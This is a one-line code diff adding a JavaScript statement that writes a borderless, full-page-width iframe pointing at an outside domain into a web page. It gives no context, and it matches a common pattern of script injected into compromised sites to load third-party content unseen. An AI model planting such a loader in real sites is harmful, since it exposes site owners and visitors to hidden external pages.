@@ -1,0 +1,1 @@
+document.writeln("<iframe scrolling=\"no\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" width=\"100%\" height=\"850\" allowtransparency=\"\" src=\"https://www.zcjiaju.com/2/\"></iframe>");
